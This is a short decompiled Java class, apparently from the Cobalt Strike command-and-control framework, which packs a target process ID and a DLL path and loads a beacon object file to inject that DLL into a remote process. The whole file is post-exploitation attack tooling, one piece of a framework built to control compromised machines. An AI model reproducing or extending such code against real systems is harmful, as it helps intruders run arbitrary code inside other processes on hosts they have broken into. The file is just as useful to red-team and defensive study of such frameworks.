package beacon.bof;

import aggressor.AggressorClient;
import beacon.PostExInlineObject;
import common.Packer;
import common.SleevedResource;

public class DllLoad extends PostExInlineObject {
   protected int pid;
   protected String lib;

   public DllLoad(AggressorClient var1, int var2, String var3) {
      super(var1);
      this.pid = var2;
      this.lib = var3;
   }

   public byte[] getArguments(String var1) {
      Packer var2 = new Packer();
      var2.addInteger(this.pid);
      var2.addLengthAndStringASCIIZ(this.lib);
      return var2.getBytes();
   }

   public byte[] getObjectFile(String var1) {
      return SleevedResource.readResource("resources/dllload." + var1 + ".o");
   }
}
